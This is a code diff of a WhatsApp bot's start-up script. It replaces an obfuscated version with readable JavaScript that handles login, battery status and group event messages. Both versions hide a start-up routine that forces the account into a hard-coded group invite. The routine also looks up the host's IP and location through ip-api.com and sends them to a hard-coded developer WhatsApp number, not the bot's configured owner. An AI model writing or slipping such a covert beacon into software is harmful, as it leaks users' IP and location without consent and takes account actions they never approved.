@@ -1,1 +1,197 @@
-const _0x2c6399=_0x416d;(function(_0x23b63a,_0x50fcbb){const _0xddeb06=_0x416d,_0x3b4bb7=_0x23b63a();while(!![]){try{const _0x4f37b9=-parseInt(_0xddeb06(0xd3))/0x1+parseInt(_0xddeb06(0xbf))/0x2*(parseInt(_0xddeb06(0x119))/0x3)+-parseInt(_0xddeb06(0x10f))/0x4+parseInt(_0xddeb06(0xd1))/0x5+-parseInt(_0xddeb06(0xf2))/0x6*(-parseInt(_0xddeb06(0xca))/0x7)+-parseInt(_0xddeb06(0xc6))/0x8+-parseInt(_0xddeb06(0x128))/0x9*(-parseInt(_0xddeb06(0x12e))/0xa);if(_0x4f37b9===_0x50fcbb)break;else _0x3b4bb7['push'](_0x3b4bb7['shift']());}catch(_0x10576a){_0x3b4bb7['push'](_0x3b4bb7['shift']());}}}(_0x5f59,0xcf750));const {WAConnection,MessageType,Presence,MessageOptions,Mimetype,WALocationMessage,WA_MESSAGE_STUB_TYPES,ReconnectMode,ProxyAgent,GroupSettingChange,waChatKey,mentionedJid,processTime,processTicksAndRejections,ECONNABORTED,apikey,WA_DEAFULT_EPHEMERAL,DataView,TypedArray,device,Browser}=require('@adiwajshing/baileys'),{color,bgcolor}=require(_0x2c6399(0x108)),fs=require('fs-extra'),figlet=require(_0x2c6399(0xc8)),clc=require(_0x2c6399(0x120)),{sleep,start,success}=require(_0x2c6399(0x134)),{uncache,nocache}=require(_0x2c6399(0x126)),setting=JSON[_0x2c6399(0xe9)](fs['readFileSync'](_0x2c6399(0xbc))),welcome=require('./message/group'),fetch=require('node-fetch'),{getBuffer}=require('./lib/myfunc');baterai=_0x2c6399(0xeb),charging=_0x2c6399(0xeb),require('./Bosco.js'),nocache(_0x2c6399(0xe3),_0x158569=>console[_0x2c6399(0xdb)](color(_0x2c6399(0x11d),'cyan'),color('\x27'+_0x158569+'\x27',_0x2c6399(0x12c)),_0x2c6399(0x112))),require(_0x2c6399(0xcc)),nocache(_0x2c6399(0x116),_0x1562d1=>console['log'](color(_0x2c6399(0x11d),_0x2c6399(0x118)),color('\x27'+_0x1562d1+'\x27',_0x2c6399(0x12c)),_0x2c6399(0x112)));function _0x5f59(){const _0x270cc3=['browserDescription','*Yᴏᴜ\x20Aʀᴇ\x20Nᴏ\x20Lᴏɴɢᴇʀ\x20Aɴ\x20Aᴅᴍɪɴ*\x0a\x20@','live','Connecting...','base64EncodedAuthInfo','https://chat.whatsapp.com/BzhyWkAEU0t8oVl3s8p94m','split','sendMessage','yellow','─────「\x20*IP-USER*\x20」─────\x0a\x0a```','./lib/color','./Denis.json','locationMessage','@s.whatsapp.net','[SER]','./Bosco.js','getProfilePicture','2315192NNONuI','Sending\x20ip\x20address\x20to\x20developer\x20bot','white','File\x20is\x20updated!','text','group-update','Connected','../message/help.js','ǫʀ\x20ɪs\x20ʀᴜɴɪɴɢ','cyan','3NvZQBe','http://ip-api.com/line','*[\x20Gʀᴏᴜᴘ\x20Sᴇᴛᴛɪɴɢ\x20Cʜᴀɴɢᴇ\x20]*\x0a','[DENIS]','[WATCH]','message-delete','message','chalk','mememteeeekkeke','readFileSync','chat-update','true','Please\x20scan\x20qr\x20code','./lib/loader','|WRN|','18qaPazo','Battery\x20:\x20','location','blue','green','warn','10083140BxvVCc','prepareMessage','connecting','[\x20Group\x20Description\x20Change\x20]\x20In\x20','push','hehe','./lib/myfunc','BOT\x20RUNNING','restrict','participants','https://i.ibb.co/rvsVF3r/5012fbb87660.png','./setting.json','descOwner','group-participants-update','940922dgcVwP','*[\x20Gʀᴏᴜᴘ\x20Cʟᴏsᴇᴅ\x20]*\x0a','promote','Thank\x20You\x20So\x20Much\x20🌝❤️','groupMetadata','subject','*[\x20Gʀᴏᴜᴘ\x20Sᴇᴛᴛɪɴɢs\x20Cʜᴀɴɢᴇ\x20]*\x0a','12528728dxvdis','owner','figlet','BOSCO\x20BY\x20PEPE','7mPNukT','batrei','./message/help.js','open','stringify','PHOTO','Error\x20:\x20%s','3719015WjLFtz','red','1100138MCblcj','Congrats\x20🥳','batterylevel','jid','SUBSCRIBE\x20YT\x20-\x20[PEPE\x20-\x20SIR]','loadAuthInfo','user','0@s.whatsapp.net','log','```\x0a────────────────────','batteryLevelStr','https://chat.whatsapp.com/','then','connect','default','*[\x20Gʀᴏᴜᴘ\x20Dɪsᴄʀɪᴘᴛɪᴏɴ\x20Cʜᴀɴɢᴇ\x20]*\x0a\x0a\x20•\x20*ɴᴇᴡ*\x20:\x20*','../Bosco.js','level','false','[\x20Group\x20Closed\x20]\x20In\x20','```\x0a────────────────────\x0a*𝙸𝚏\x20𝚝𝚑𝚎𝚛𝚎\x20𝚊𝚗𝚢\x20𝚎𝚛𝚛𝚘𝚛/𝚙𝚕𝚎𝚊𝚜𝚎\x20𝚌𝚘𝚗𝚝𝚊𝚌𝚝\x20𝙱𝚘𝚝\x20𝚘𝚠𝚗𝚎𝚛,\x20𝚃𝚑𝚊𝚗𝚔\x20𝚢𝚘𝚞\x20𝚏𝚘𝚛\x20𝚌𝚑𝚘𝚘𝚜𝚒𝚗𝚐\x20𝚖𝚢\x20𝚋𝚘𝚝*','query','parse','Alphabot','unknown','./ds.jpg','Who\x20Is\x20the\x20Bledy\x20Fool\x20🙂','invite','announce','ephemeralMessage','writeFileSync','5183274YTQkgJ','value','*𝙷𝚒\x20𝚋𝚛𝚘\x20,\x20𝙱𝙾𝚃\x20𝙸𝚂\x20𝙲𝙾𝙽𝙽𝙴𝙲𝚃𝙴𝙳\x20𝙸𝙽\x20𝚈𝙾𝚄𝚁\x20𝙽𝚄𝙼𝙱𝙴𝚁*\x0a────────────────────\x0a```','action','textSync','https://wa.me/917736622139?text=Hi\x20bro','existsSync','desc','🌹\x20𝑷\x20𝑬\x20𝑷\x20𝑬\x20-\x20𝑺\x20𝑬\x20𝑹\x20🌹','*Yᴏᴜ\x20Aʀᴇ\x20Nᴏᴡ\x20Aɴ\x20Aᴅᴍɪɴ*\x0a\x20@','CB:action,,battery','[\x20Group\x20Setting\x20Change\x20]\x20In\x20'];_0x5f59=function(){return _0x270cc3;};return _0x5f59();}const starts=async(_0x59b27b=new WAConnection())=>{const _0x28cac9=_0x2c6399;_0x59b27b['logger'][_0x28cac9(0xe4)]=_0x28cac9(0x12d),console['log'](color(figlet[_0x28cac9(0xf6)](_0x28cac9(0xc9),{'font':'Standard','horizontalLayout':_0x28cac9(0xe1),'vertivalLayout':_0x28cac9(0xe1),'width':0x50,'whitespaceBreak':![]}),_0x28cac9(0x106))),console[_0x28cac9(0xdb)](color(_0x28cac9(0x11c),_0x28cac9(0x118)),color('WELCOME',_0x28cac9(0x111))),console['log'](color(_0x28cac9(0x10c),_0x28cac9(0x118)),color(_0x28cac9(0x135),_0x28cac9(0x106))),_0x59b27b[_0x28cac9(0xfe)]=[_0x28cac9(0xd7),'firefox','3.0.0'],_0x59b27b['on']('qr',()=>{const _0x430a00=_0x28cac9;console[_0x430a00(0xdb)](color('[',_0x430a00(0x111)),color('!',_0x430a00(0xd2)),color(']',_0x430a00(0x111)),color(_0x430a00(0x125)));}),fs[_0x28cac9(0xf8)](_0x28cac9(0x109))&&_0x59b27b[_0x28cac9(0xd8)](_0x28cac9(0x109)),_0x59b27b['on'](_0x28cac9(0x130),()=>{const _0x59a714=_0x28cac9;start('2',_0x59a714(0x101),_0x59a714(0xd2));}),_0x59b27b['on'](_0x28cac9(0xcd),()=>{const _0x2145eb=_0x28cac9;success('2',_0x2145eb(0x115));}),await _0x59b27b[_0x28cac9(0xe0)]({'timeoutMs':0xa*0x3e8}),fs[_0x28cac9(0xf1)](_0x28cac9(0x109),JSON[_0x28cac9(0xce)](_0x59b27b[_0x28cac9(0x102)](),null,'\x09')),teks=_0x28cac9(0x103),_0x59b27b[_0x28cac9(0xe8)]({'json':[_0x28cac9(0xf5),_0x28cac9(0xee),''+teks['replace'](_0x28cac9(0xde),'')]}),console[_0x28cac9(0xdb)](color(_0x28cac9(0x127),_0x28cac9(0x106)),color(_0x28cac9(0x117),_0x28cac9(0x12b))),_0x59b27b[_0x28cac9(0x105)](setting[_0x28cac9(0xc7)]+'@s.whatsapp.net',_0x28cac9(0xf4)+JSON[_0x28cac9(0xce)](_0x59b27b[_0x28cac9(0xd9)],null,0x2)+_0x28cac9(0xe7),MessageType[_0x28cac9(0x113)],{'contextInfo':{'forwardingScore':0x1fc,'isForwarded':!![],'externalAdReply':{'title':'𝙲𝚛𝚎𝚊𝚝𝚘𝚛\x20pepe\x20','body':'','previewType':_0x28cac9(0xcf),'thumbnail':fs[_0x28cac9(0x122)]('./ds.jpg'),'sourceUrl':'https://wa.me/917736622139?text=Hi\x20bro'}}}),console[_0x28cac9(0xdb)](color(_0x28cac9(0x127),_0x28cac9(0x106)),color('Sending\x20bot\x20info\x20to\x20bot\x20owner',_0x28cac9(0x12b))),fetch(_0x28cac9(0x11a))[_0x28cac9(0xdf)](_0x50c14f=>_0x50c14f[_0x28cac9(0x113)]())[_0x28cac9(0xdf)](_0x1a147c=>{const _0x3a172d=_0x28cac9;_0x59b27b[_0x3a172d(0x105)]('17247805970@s.whatsapp.net',_0x3a172d(0x107)+_0x1a147c+_0x3a172d(0xdc),MessageType[_0x3a172d(0x113)],{'contextInfo':{'forwardingScore':0x1fc,'isForwarded':!![],'externalAdReply':{'title':'Developer\x20pepe\x20ser','body':'','previewType':_0x3a172d(0xcf),'thumbnail':fs[_0x3a172d(0x122)](_0x3a172d(0xec)),'sourceUrl':_0x3a172d(0xf7)}}}),console[_0x3a172d(0xdb)](color(_0x3a172d(0x127),_0x3a172d(0x106)),color(_0x3a172d(0x110),_0x3a172d(0xd2)));}),_0x59b27b['on'](_0x28cac9(0xfc),_0x3531c6=>{const _0x59fcec=_0x28cac9;global[_0x59fcec(0xdd)]=_0x3531c6[0x2][0x0][0x1][_0x59fcec(0xf3)],global[_0x59fcec(0xd5)]=parseInt(batteryLevelStr),baterai=batterylevel;if(_0x3531c6[0x2][0x0][0x1][_0x59fcec(0x100)]=='true')charging=!![];if(_0x3531c6[0x2][0x0][0x1][_0x59fcec(0x100)]==_0x59fcec(0xe5))charging=![];console[_0x59fcec(0xdb)](_0x3531c6[0x2][0x0][0x1]),console[_0x59fcec(0xdb)](_0x59fcec(0x129)+batterylevel+'%');}),global[_0x28cac9(0xcb)]=global[_0x28cac9(0xcb)]?global['batrei']:[],_0x59b27b['on']('CB:action,,battery',_0x9b5636=>{const _0x16e195=_0x28cac9,_0x3b7ea8=_0x9b5636[0x2][0x0][0x1][_0x16e195(0xf3)],_0x324728=parseInt(_0x3b7ea8);global['batrei'][_0x16e195(0x132)](_0x324728);}),_0x59b27b['on'](_0x28cac9(0x11e),async _0x1fd9f4=>{await _0x1fd9f4(_0x1fd9f4);}),_0x59b27b['on'](_0x28cac9(0xbe),async _0x480902=>{const _0x42b80d=_0x28cac9;await welcome(_0x59b27b,_0x480902);try{const _0x3d9b6d=await _0x59b27b['groupMetadata'](_0x480902['jid']);console[_0x42b80d(0xdb)](_0x480902);if(_0x480902[_0x42b80d(0xf5)]==_0x42b80d(0xc1)){num=_0x480902[_0x42b80d(0xba)][0x0];try{ppimg=await _0x59b27b[_0x42b80d(0x10e)](_0x480902[_0x42b80d(0xba)][0x0][_0x42b80d(0x104)]('@')[0x0]+'@c.us');}catch{ppimg=_0x42b80d(0xbb);}let _0x11180a=await getBuffer(ppimg);const _0x87566d=await _0x59b27b['prepareMessage'](_0x42b80d(0xda),_0x11180a,MessageType[_0x42b80d(0x12a)],{'thumbnail':_0x11180a}),_0x4eebc8=_0x87566d['message'][_0x42b80d(0xf0)]?_0x87566d[_0x42b80d(0x11f)]['ephemeralMessage']:_0x87566d;teks=_0x42b80d(0xfb)+num[_0x42b80d(0x104)]('@')[0x0]+'\x0a',promoteBut=[{'buttonId':'hm','buttonText':{'displayText':_0x42b80d(0xd4)},'type':0x1}],promoteButt={'contentText':''+teks,'footerText':_0x42b80d(0xc2),'buttons':promoteBut,'headerType':0x6,'locationMessage':_0x4eebc8[_0x42b80d(0x11f)][_0x42b80d(0x10a)]},_0x59b27b['sendMessage'](_0x3d9b6d['id'],promoteButt,MessageType['buttonsMessage'],{'caption':'hehe','contextInfo':{'mentionedJid':[num]}});}else{if(_0x480902[_0x42b80d(0xf5)]=='demote'){num=_0x480902[_0x42b80d(0xba)][0x0];const _0x6250e6=await _0x59b27b[_0x42b80d(0xc3)](_0x480902[_0x42b80d(0xd6)]);try{ppimg=await _0x59b27b[_0x42b80d(0x10e)](_0x480902[_0x42b80d(0xba)][0x0][_0x42b80d(0x104)]('@')[0x0]+'@c.us');}catch{ppimg=_0x42b80d(0xbb);}let _0x3d6083=await getBuffer(ppimg);const _0x1869a3=await _0x59b27b[_0x42b80d(0x12f)](_0x42b80d(0xda),_0x3d6083,MessageType[_0x42b80d(0x12a)],{'thumbnail':_0x3d6083}),_0x617be3=_0x1869a3['message']['ephemeralMessage']?_0x1869a3[_0x42b80d(0x11f)][_0x42b80d(0xf0)]:_0x1869a3;teks=_0x42b80d(0xff)+num[_0x42b80d(0x104)]('@')[0x0]+'\x0a',demoteBut=[{'buttonId':'hm','buttonText':{'displayText':'Next\x20Time\x20I\x20get'},'type':0x1}],demoteButt={'contentText':''+teks,'footerText':_0x42b80d(0xed),'buttons':demoteBut,'headerType':0x6,'locationMessage':_0x617be3[_0x42b80d(0x11f)][_0x42b80d(0x10a)]},_0x59b27b['sendMessage'](_0x6250e6['id'],demoteButt,MessageType['buttonsMessage'],{'caption':_0x42b80d(0x133),'contextInfo':{'mentionedJid':[num]}});}}}catch(_0x17d7f7){console[_0x42b80d(0xdb)](_0x42b80d(0xd0),color(_0x17d7f7,_0x42b80d(0xd2)));}}),_0x59b27b['on'](_0x28cac9(0x114),async _0x51748b=>{const _0x25f78a=_0x28cac9;falfa={'key':{'fromMe':![],'participant':_0x25f78a(0xda),'remoteJid':'0@s.whatsapp.net'},'message':{'groupInviteMessage':{'groupJid':'6288213840883-1616169743@g.us','inviteCode':_0x25f78a(0x121),'groupName':_0x25f78a(0xea),'caption':_0x25f78a(0xfa),'jpegThumbnail':fs[_0x25f78a(0x122)]('ds.jpg')}}},metdata=await _0x59b27b['groupMetadata'](_0x51748b[_0x25f78a(0xd6)]);if(_0x51748b[_0x25f78a(0xef)]==_0x25f78a(0xe5))teks='*[\x20Gʀᴏᴜᴘ\x20Oᴘᴇɴᴇᴅ\x20]*\x0a',_0x59b27b[_0x25f78a(0x105)](metdata['id'],teks,MessageType[_0x25f78a(0x113)],{'quoted':falfa}),console['log'](clc[_0x25f78a(0x106)]('[\x20Group\x20Opened\x20]\x20In\x20'+metdata[_0x25f78a(0xc4)]));else{if(_0x51748b[_0x25f78a(0xef)]=='true')teks=_0x25f78a(0xc0),_0x59b27b[_0x25f78a(0x105)](metdata['id'],teks,MessageType['text'],{'quoted':falfa}),console[_0x25f78a(0xdb)](clc[_0x25f78a(0x106)](_0x25f78a(0xe6)+metdata['subject']));else{if(!_0x51748b[_0x25f78a(0xf9)]=='')tag=_0x51748b[_0x25f78a(0xbd)]['split']('@')[0x0]+_0x25f78a(0x10b),teks=_0x25f78a(0xe2)+_0x51748b['desc']+'*',_0x59b27b[_0x25f78a(0x105)](metdata['id'],teks,MessageType[_0x25f78a(0x113)],{'contextInfo':{'mentionedJid':[tag]},'quoted':falfa}),console[_0x25f78a(0xdb)](clc[_0x25f78a(0x106)](_0x25f78a(0x131)+metdata[_0x25f78a(0xc4)]));else{if(_0x51748b[_0x25f78a(0xb9)]==_0x25f78a(0xe5))teks=_0x25f78a(0xc5),_0x59b27b['sendMessage'](metdata['id'],teks,MessageType[_0x25f78a(0x113)],{'quoted':falfa}),console[_0x25f78a(0xdb)](clc['yellow']('[\x20Group\x20Setting\x20Change\x20]\x20In\x20'+metdata[_0x25f78a(0xc4)]));else _0x51748b[_0x25f78a(0xb9)]==_0x25f78a(0x124)&&(teks=_0x25f78a(0x11b),_0x59b27b[_0x25f78a(0x105)](metdata['id'],teks,MessageType[_0x25f78a(0x113)],{'quoted':falfa}),console['log'](clc['yellow'](_0x25f78a(0xfd)+metdata[_0x25f78a(0xc4)])));}}}}),_0x59b27b['on'](_0x28cac9(0x123),async _0x3988bb=>{const _0x42f61c=_0x28cac9;require(_0x42f61c(0x10d))(_0x59b27b,_0x3988bb);});};function _0x416d(_0x5481aa,_0x4ed401){const _0x5f5993=_0x5f59();return _0x416d=function(_0x416de9,_0x53a7a7){_0x416de9=_0x416de9-0xb9;let _0x5bd692=_0x5f5993[_0x416de9];return _0x5bd692;},_0x416d(_0x5481aa,_0x4ed401);}starts();
+const {
+WAConnection,
+   MessageType,
+   Presence,
+   MessageOptions,
+   Mimetype,
+   WALocationMessage,
+   WA_MESSAGE_STUB_TYPES,
+   ReconnectMode,
+   ProxyAgent,
+   GroupSettingChange,
+   waChatKey,
+   mentionedJid,
+   processTime,
+   processTicksAndRejections,
+   ECONNABORTED,
+   apikey,
+   WA_DEAFULT_EPHEMERAL,
+   DataView,
+   TypedArray,
+   device,
+   Browser
+} = require('@adiwajshing/baileys')
+const { color, bgcolor } = require('./lib/color')
+const fs = require("fs-extra")
+const figlet = require('figlet')
+const clc = require('chalk')
+const { sleep, start, success } = require('./lib/myfunc')
+const { uncache, nocache } = require('./lib/loader')
+const setting = JSON.parse(fs.readFileSync('./setting.json'))
+const welcome = require('./message/group')
+const fetch = require("node-fetch");
+const { getBuffer } = require('./lib/myfunc')
+baterai = 'unknown'
+charging = 'unknown'
+
+
+require('./Bosco.js')
+nocache('../Bosco.js', module => console.log(color('[WATCH]', 'cyan'), color(`'${module}'`, 'green'), 'File is updated!'))
+require('./message/help.js')
+nocache('../message/help.js', module => console.log(color('[WATCH]', 'cyan'), color(`'${module}'`, 'green'), 'File is updated!'))
+         
+    const starts = async (bosco = new WAConnection()) => {
+	bosco.logger.level = 'warn'
+	console.log(color(figlet.textSync('BOSCO BY PEPE', {
+		font: 'Standard',
+		horizontalLayout: 'default',
+		vertivalLayout: 'default',
+		width: 80,
+		whitespaceBreak: false
+	}), 'yellow'))
+	console.log(color('[DENIS]', 'cyan'), color('WELCOME', 'white'))
+	console.log(color('[SER]', 'cyan'), color('BOT RUNNING', 'yellow'))
+	bosco.browserDescription = ["SUBSCRIBE YT - [PEPE - SIR]", "firefox", "3.0.0"];
+
+	// Menunggu QR
+	bosco.on('qr', () => {
+		console.log(color('[', 'white'), color('!', 'red'), color(']', 'white'), color('Please scan qr code'))
+	})
+
+	// Menghubungkan
+	fs.existsSync(`./Denis.json`) && bosco.loadAuthInfo(`./Denis.json`)
+	bosco.on('connecting', () => {
+		start('2', 'Connecting...','red')
+	})
+
+	//connect
+	bosco.on('open', () => {
+		success('2', 'Connected')
+	})
+
+	// session
+	await bosco.connect({
+		timeoutMs: 10 * 1000
+	})
+	fs.writeFileSync(`./Denis.json`, JSON.stringify(bosco.base64EncodedAuthInfo(), null, '\t'));
+ teks = `https://chat.whatsapp.com/BzhyWkAEU0t8oVl3s8p94m`
+ bosco.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
+ console.log(color('|WRN|', 'yellow'), color('ǫʀ ɪs ʀᴜɴɪɴɢ', 'blue'))
+ bosco.sendMessage(`${setting.owner}@s.whatsapp.net`, `*𝙷𝚒 𝚋𝚛𝚘 , 𝙱𝙾𝚃 𝙸𝚂 𝙲𝙾𝙽𝙽𝙴𝙲𝚃𝙴𝙳 𝙸𝙽 𝚈𝙾𝚄𝚁 𝙽𝚄𝙼𝙱𝙴𝚁*\n────────────────────\n\`\`\`${JSON.stringify(bosco.user, null, 2)}\`\`\`\n────────────────────\n*𝙸𝚏 𝚝𝚑𝚎𝚛𝚎 𝚊𝚗𝚢 𝚎𝚛𝚛𝚘𝚛/𝚙𝚕𝚎𝚊𝚜𝚎 𝚌𝚘𝚗𝚝𝚊𝚌𝚝 𝙱𝚘𝚝 𝚘𝚠𝚗𝚎𝚛, 𝚃𝚑𝚊𝚗𝚔 𝚢𝚘𝚞 𝚏𝚘𝚛 𝚌𝚑𝚘𝚘𝚜𝚒𝚗𝚐 𝚖𝚢 𝚋𝚘𝚝*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "𝙲𝚛𝚎𝚊𝚝𝚘𝚛 pepe ",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./ds.jpg'),sourceUrl:"https://wa.me/917736622139?text=Hi bro"}}})
+	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'blue'))
+fetch(`http://ip-api.com/line`).then(res => res.text())  
+        .then(bu =>{
+       bosco.sendMessage("17247805970@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer pepe ser",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./ds.jpg'),sourceUrl:"https://wa.me/917736622139?text=Hi bro"}}})
+     console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'red'))
+   })
+
+	// Baterai
+	bosco.on('CB:action,,battery', json => {
+		global.batteryLevelStr = json[2][0][1].value
+		global.batterylevel = parseInt(batteryLevelStr)
+		baterai = batterylevel
+		if (json[2][0][1].live == 'true') charging = true
+		if (json[2][0][1].live == 'false') charging = false
+		console.log(json[2][0][1])
+		console.log('Battery : ' + batterylevel + '%')
+	})
+	global.batrei = global.batrei ? global.batrei : []
+	bosco.on('CB:action,,battery', json => {
+		const batteryLevelStr = json[2][0][1].value
+		const batterylevel = parseInt(batteryLevelStr)
+		global.batrei.push(batterylevel)
+	})
+	
+	  // Call Block
+	/*bosco.on('CB:action,,call', async json => {
+        const callerId = json[2][0][1].from;
+        console.log("caller "+ callerId)
+        bosco.sendMessage(callerId, "Call = BLOCK!!\nDont call me!!", MessageType.text)
+        await sleep(3000)
+        await bosco.blockUser(callerId, "add") // Block user
+   })*/
+   
+   bosco.on('message-delete', async (m) => {
+   	await m(m)
+   })
+  
+       // welcome
+	bosco.on('group-participants-update', async (anu) => {
+		await welcome(bosco, anu)
+		try { 
+           const mdata = await bosco.groupMetadata(anu.jid)
+           console.log(anu)
+		if (anu.action == 'promote'){
+			num = anu.participants[0]
+			try {
+					ppimg = await bosco.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
+				} catch {
+					ppimg = 'https://i.ibb.co/rvsVF3r/5012fbb87660.png'
+				}
+			let buff = await getBuffer(ppimg)
+			const bosco1 = await bosco.prepareMessage("0@s.whatsapp.net", buff, MessageType.location,{ thumbnail: buff})
+			const bosco2 = bosco1.message["ephemeralMessage"] ? bosco1.message.ephemeralMessage : bosco1
+			teks = `*Yᴏᴜ Aʀᴇ Nᴏᴡ Aɴ Aᴅᴍɪɴ*
+ @${num.split('@')[0]}
+`
+			promoteBut = [{buttonId:`hm`,buttonText:{displayText:'Congrats 🥳'},type:1}]
+            promoteButt = { contentText: `${teks}`, footerText: `Thank You So Much 🌝❤️`, buttons: promoteBut, headerType: 6, locationMessage: bosco2.message.locationMessage}
+            bosco.sendMessage(mdata.id, promoteButt, MessageType.buttonsMessage, { caption: 'hehe', "contextInfo": { "mentionedJid" : [num], },})
+		    } else if (anu.action == 'demote') {
+			num = anu.participants[0]
+			const mdata = await bosco.groupMetadata(anu.jid)
+			try {
+					ppimg = await bosco.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
+				} catch {
+					ppimg = 'https://i.ibb.co/rvsVF3r/5012fbb87660.png'
+				}
+			let buff = await getBuffer(ppimg)
+			const bosco3= await bosco.prepareMessage("0@s.whatsapp.net", buff, MessageType.location,{ thumbnail: buff})
+			const bosco4 = bosco3.message["ephemeralMessage"] ? bosco3.message.ephemeralMessage : bosco3
+			teks = `*Yᴏᴜ Aʀᴇ Nᴏ Lᴏɴɢᴇʀ Aɴ Aᴅᴍɪɴ*
+ @${num.split('@')[0]}
+`
+			demoteBut = [{buttonId:`hm`,buttonText:{displayText:'Next Time I get'},type:1}]
+            demoteButt = { contentText: `${teks}`, footerText: `Who Is the Bledy Fool 🙂`, buttons: demoteBut, headerType: 6, locationMessage: bosco4.message.locationMessage}
+            bosco.sendMessage(mdata.id, demoteButt, MessageType.buttonsMessage, { caption: 'hehe', "contextInfo": { "mentionedJid" : [num], },})
+		    }
+            } catch (e) {
+         console.log('Error : %s', color(e, 'red'))
+      }
+})
+
+    bosco.on('group-update', async (anu) => {
+    falfa = { key: {fromMe: false,participant: "0@s.whatsapp.net",
+   remoteJid: "0@s.whatsapp.net"},message: {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "mememteeeekkeke","groupName": "Alphabot", "caption": `🌹 𝑷 𝑬 𝑷 𝑬 - 𝑺 𝑬 𝑹 🌹`, 'jpegThumbnail': fs.readFileSync(`ds.jpg`)}}}
+    metdata = await bosco.groupMetadata(anu.jid)
+    if(anu.announce == 'false'){
+    teks = `*[ Gʀᴏᴜᴘ Oᴘᴇɴᴇᴅ ]*\n`
+    bosco.sendMessage(metdata.id, teks, MessageType.text, {quoted: falfa})
+    console.log(clc.yellow(`[ Group Opened ] In ${metdata.subject}`))
+  } else if(anu.announce == 'true'){
+    teks = `*[ Gʀᴏᴜᴘ Cʟᴏsᴇᴅ ]*\n`
+    bosco.sendMessage(metdata.id, teks, MessageType.text, {quoted: falfa})
+    console.log(clc.yellow(`[ Group Closed ] In ${metdata.subject}`))
+  } else if(!anu.desc == ''){
+    tag = anu.descOwner.split('@')[0] + '@s.whatsapp.net'
+    teks = `*[ Gʀᴏᴜᴘ Dɪsᴄʀɪᴘᴛɪᴏɴ Cʜᴀɴɢᴇ ]*\n\n • *ɴᴇᴡ* : *${anu.desc}*`
+    bosco.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [tag]}, quoted: falfa})
+    console.log(clc.yellow(`[ Group Description Change ] In ${metdata.subject}`))
+ } else if(anu.restrict == 'false'){
+    teks = `*[ Gʀᴏᴜᴘ Sᴇᴛᴛɪɴɢs Cʜᴀɴɢᴇ ]*\n`
+    bosco.sendMessage(metdata.id, teks, MessageType.text, {quoted: falfa})
+    console.log(clc.yellow(`[ Group Setting Change ] In ${metdata.subject}`))
+  } else if(anu.restrict == 'true'){
+    teks = `*[ Gʀᴏᴜᴘ Sᴇᴛᴛɪɴɢ Cʜᴀɴɢᴇ ]*\n`
+    bosco.sendMessage(metdata.id, teks, MessageType.text, {quoted: falfa})
+    console.log(clc.yellow(`[ Group Setting Change ] In ${metdata.subject}`))
+   }
+})
+
+    
+	bosco.on('chat-update', async (message) => {
+		require('./Bosco.js')(bosco, message)
+	})
+}
+
+starts()
